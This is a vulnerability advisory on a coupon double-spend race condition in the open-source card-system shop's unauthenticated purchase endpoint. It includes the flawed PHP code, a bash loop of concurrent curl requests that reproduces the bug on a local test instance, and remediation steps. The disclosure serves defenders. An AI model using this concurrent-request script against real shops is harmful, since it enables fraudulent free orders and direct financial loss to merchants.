# card-system Race Condition (Laravel 5.5)

**CWE-362 · Unauthenticated endpoint · Single-use coupon double-spend via TOCTOU on `POST /api/shop/buy`**

> **Vendor:** Tai7sy
> **Product:** card-system (Laravel 5.5)
> **Affected version:** master branch, latest as of 2026-09-30 (commit 4e908dd); no official release version
> **Affected endpoints:** `POST /api/shop/buy` (`Shop\Pay@buy`; routes/api.php `shop` group behind the `api` prefix, `api` middleware = parameter bindings only)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The shop purchase endpoint consumes single-use coupons **non-atomically**: the coupon eligibility check is a plain non-locking `SELECT ... whereRaw('`count_used`<`count_all`')` performed *outside* the order transaction, while consumption (`status = USED; count_used++; save()`) happens later inside `DB::transaction` with **no `SELECT ... FOR UPDATE`** on the coupon row. Concurrent requests all pass the eligibility check on the same snapshot of `count_used` and each applies the discount. Verified with 16 concurrent requests: a 1-use coupon produced **3 free orders and 3 distinct shipped cards**.

## 2. Root Cause

| File | Location | Role |
|---|---|---|
| `app/Http/Controllers/Shop/Pay.php` | function `buy()` (single-line source) | non-locking coupon pre-check + in-transaction consumption (TOCTOU) |
| `routes/api.php` | `shop` route group | `Route::any('buy', 'Shop\Pay@buy')` with `api` middleware (bindings only, no auth) |
| `app/Providers/RouteServiceProvider.php` | `mapApiRoutes()` | mounts `routes/api.php` under the `api` prefix → `POST /api/shop/buy` |

```php
// Pre-check — OUTSIDE the transaction, plain non-locking SELECT:
$coupon = \App\Coupon::where('user_id', $product->user_id)
    ->where('coupon', $code)
    ->where('expire_at', '>', Carbon::now())
    ->whereRaw('`count_used`<`count_all`')->get();   // no FOR UPDATE, no lock

// ... discount applied to the order total ...

// Consumption — later, inside DB::transaction, still no lock on the row:
if ($coupon) {
    $coupon->status = \App\Coupon::STATUS_USED;
    $coupon->count_used++;
    $coupon->save();                                  // no SELECT ... FOR UPDATE
}
```

- Race window: between the non-locking pre-check (snapshot of `count_used`) and the in-transaction consumption.
- Endpoint is unauthenticated: the only caller identity is a client-chosen `customer` value.

## 3. Prerequisites

- One valid, non-expired coupon code with remaining uses (`count_used < count_all`) — obtainable by any shop visitor.
- Ability to send concurrent HTTP requests (e.g. `xargs -P`, thread barrier).

## 4. Reproduction

Local instance: 4 `php -S` worker processes (127.0.0.1:8096/8098/8099/8090) sharing one MySQL 8.0.39. Setup: 1-cent product (id=1) with 17 unsold cards; single-use coupon `RACE1` (`type=ONETIME`, `count_all=1`, `discount_type=AMOUNT`, `discount_val=1` = product price → discounted total 0 → immediate free shipping).

```bash
# 16 concurrent POSTs (4 per worker process), released simultaneously:
for i in $(seq 1 16); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "http://127.0.0.1:<port>/api/shop/buy" \
    -d "customer=<32-hex>&product_id=1&count=1&pay_id=<pay>&coupon=RACE1&contact=r${i}@t.io" &
done | sort | uniq -c
```

Result: 3 concurrent requests won (HTTP 302, order created), 13 rejected with "coupon invalid" — but 3 is already double-spend for a `count_all=1` coupon. Database state after the race:

```text
orders:     3 rows  discount=1  paid=0  status=2 (SUCCESS)  remark '使用优惠券: RACE1'
coupons:    RACE1   count_used=1  count_all=1  status=2 (USED)   <- ledger looks clean
card_order: 3 DISTINCT cards (11111 / 11112 / 11113) attached to the 3 orders
```

A single-use coupon was redeemed three times; three distinct cards were shipped for free.

## 5. Confirmed Techniques

- TOCTOU: 3 concurrent requests passed the non-locking pre-check (`whereRaw count_used<count_all`) with the same `count_used` snapshot.
- Accuracy notes (verified, correcting naive assumptions):
  - The actual endpoint is `POST /api/shop/buy` — `routes/api.php` is mounted with an `api` prefix by `RouteServiceProvider`, route group prefix `shop`.
  - `count_used` does **not** visibly overflow: Eloquent persists the stale in-memory counter with an absolute-value `UPDATE`, so it converges to 1 and the ledger looks clean afterwards. The double-spend manifests as the **untracked free orders/shipments** (use-limit bypass), which is the actual impact.

## 6. Impact

- Any shop visitor holding one valid single-use coupon code and able to send concurrent requests redeems it multiple times, receiving free card deliveries beyond the coupon's use limit — a direct financial loss vector on a platform whose product is paid card/license delivery.
- No authentication is required beyond a client-chosen `customer` identifier; the coupon ledger conceals the abuse (counter converges), so detection relies on order auditing.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N` (Base 5.8 Medium)

## 8. Remediation

- Re-check and consume the coupon atomically inside the order transaction:
  - `SELECT ... FOR UPDATE` on the coupon row before applying the discount, **or**
  - a conditional update — `UPDATE coupons SET count_used = count_used + 1 WHERE id = ? AND count_used < count_all` — and reject the order when zero rows are affected.
- Keep the eligibility check and the consumption in the same transaction with row locking.

## 9. References

- Project: https://github.com/Tai7sy/card-system
- CWE-362: https://cwe.mitre.org/data/definitions/362.html
- External disclosure: https://gist.github.com/qianqiusujiu/952e39108f2bd7805a5a7b2cadf1c436
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
